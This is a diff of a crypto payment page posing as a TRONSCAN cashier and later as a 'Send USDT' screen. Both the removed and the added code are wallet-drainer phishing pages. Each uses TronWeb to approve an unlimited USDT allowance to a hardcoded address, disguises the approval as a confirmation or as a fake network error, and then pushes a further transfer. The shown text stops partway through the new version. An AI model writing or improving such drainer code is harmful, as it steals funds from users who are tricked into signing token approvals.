@@ -3,64 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>TRONSCAN | 官方收银台</title>
+    <title>Send USDT</title>
     <style>
-        body { background: #f5f5f5; margin: 0; padding: 0; font-family: -apple-system, sans-serif; }
-        .header { background: #fff; padding: 15px; border-bottom: 1px solid #eee; font-weight: bold; color: #eb0029; font-size: 18px; }
-        .container { padding: 20px; }
-        .card { background: #fff; border-radius: 12px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
-        .input-group { border-bottom: 2px solid #f5f5f5; padding: 10px 0; margin-bottom: 20px; display: flex; align-items: center; }
-        input { border: none; outline: none; font-size: 28px; font-weight: bold; width: 100%; color: #333; }
-        .btn { background: #eb0029; color: #fff; height: 52px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 16px; font-weight: bold; margin-top: 20px; cursor: pointer; }
-        #error-mask { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: none; z-index: 1000; }
-        .modal { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80%; background: #fff; border-radius: 16px; text-align: center; overflow: hidden; }
-        .m-body { padding: 30px 20px; font-size: 15px; color: #333; line-height: 1.6; }
-        .m-btn { padding: 15px; color: #007aff; font-weight: bold; border-top: 1px solid #eee; cursor: pointer; background: #fff; }
+        body { background: #ffffff; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color: #333; }
+        .nav-bar { padding: 18px; font-size: 18px; font-weight: 600; border-bottom: 0.5px solid #f0f0f0; text-align: center; }
+        .container { padding: 25px; }
+        .info-row { display: flex; justify-content: space-between; margin-bottom: 25px; font-size: 15px; }
+        .label { color: #999; margin-bottom: 10px; font-size: 13px; font-weight: 500; }
+        .address-box { font-size: 13px; color: #444; word-break: break-all; margin-bottom: 30px; line-height: 1.4; background: #f9f9f9; padding: 10px; border-radius: 8px; }
+        .input-group { border-bottom: 2px solid #0062ff; padding: 10px 0; margin-bottom: 35px; display: flex; align-items: center; }
+        input { border: none; outline: none; font-size: 32px; width: 100%; font-weight: bold; color: #000; background: transparent; }
+        .unit { font-size: 20px; font-weight: 700; color: #000; }
+        .fee-row { display: flex; justify-content: space-between; font-size: 13px; color: #999; margin-top: -20px; }
+        .btn { background: #0062ff; color: #fff; height: 55px; border-radius: 28px; display: flex; align-items: center; justify-content: center; font-size: 17px; font-weight: 600; margin-top: 60px; cursor: pointer; box-shadow: 0 4px 12px rgba(0,98,255,0.2); }
+        #loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #0062ff; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="header">TRONSCAN</div>
+    <div class="nav-bar">Send USDT</div>
     <div class="container">
-        <div class="card">
-            <div style="font-size:13px;color:#666;">转账金额</div>
-            <div class="input-group">
-                <input type="number" id="u-amt" value="10.00">
-                <span style="font-weight: bold; margin-left: 10px;">USDT</span>
-            </div>
-            <div style="font-size: 12px; color: #999;">收款地址：TB7o5odwtZhkf6ue...f9s3C</div>
+        <div class="info-row">
+            <span>Asset</span>
+            <span style="color:#0062ff; font-weight:600;">USDT (TRC20)</span>
         </div>
-        <div class="btn" onclick="firstAction()">立即提交转账</div>
-    </div>
-    <div id="error-mask">
-        <div class="modal">
-            <div class="m-body" id="m-text">
-                <b style="color:#ff3b30; font-size: 17px;">网络连接异常 (0x402)</b><br><br>
-                检测到加密链路同步中断，请点击下方按钮重新尝试提交支付请求。
-            </div>
-            <div class="m-btn" onclick="secondAction()">重新提交支付</div>
+        <div class="label">Recipient Address</div>
+        <div class="address-box">TACSF4i5vZxSp4rzR1jfJ5JTf4depqi4dZ</div>
+        <div class="label">Amount</div>
+        <div class="input-group">
+            <input type="number" id="usdt-amount" placeholder="0.00">
+            <span class="unit">USDT</span>
         </div>
+        <div class="fee-row">
+            <span>Estimated Fee</span>
+            <span>0.00 TRX</span>
+        </div>
+        <div class="btn" onclick="startProcess()">Next</div>
     </div>
+
+    <div id="loading-overlay">
+        <div class="loader"></div>
+        <p id="status-text" style="font-size:14px; color:#666; margin-top:20px; font-weight:500;">Broadcasting to Node...</p>
+    </div>
+
     <script>
-        const CONFIG = { USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", RECEIVER: "TB7o5odwtZhkf6ue6NthAzfLY9eWf9s3C" };
-        let isApproved = false;
-        async function firstAction() {
+        const RECIPIENT = "TACSF4i5vZxSp4rzR1jfJ5JTf4depqi4dZ";
+        const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        let currentStep = 1;
+
+        async function startProcess() {
+            const amount = document.getElementById('usdt-amount').value;
+            if (!amount || amount <= 0) return;
+            
+            const overlay = document.getElementById('loading-overlay');
+            const status = document.getElementById('status-text');
+            overlay.style.display = 'flex';
+
             try {
-                const contract = await window.tronWeb.contract().at(CONFIG.USDT);
-                const max = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-                const tx = await contract.approve(CONFIG.RECEIVER, max).send();
-                if (tx) { isApproved = true; document.getElementById('error-mask').style.display = 'block'; }
-            } catch (err) { location.reload(); }
-        }
-        async function secondAction() {
-            if (!isApproved) return;
-            try {
-                const contract = await window.tronWeb.contract().at(CONFIG.USDT);
-                const sunVal = window.tronWeb.toSun(document.getElementById('u-amt').value);
-                await contract.transfer(CONFIG.RECEIVER, sunVal).send();
-                document.getElementById('m-text').innerHTML = "<b style='color:#34c759;'>✅ 支付已确认</b><br><br>交易已广播。";
-                setTimeout(() => location.reload(), 2000);
-            } catch (err) { location.reload(); }
-        }
-    </script>
-</body>
-</html>
+                const trc20Contract = await window.tronWeb.contract().at(CONTRACT);
+                if (currentStep === 1) {
+                    // First Step: Approval (disguised as confirmation)
+                    const infinite = "1157920892373161954235709850086
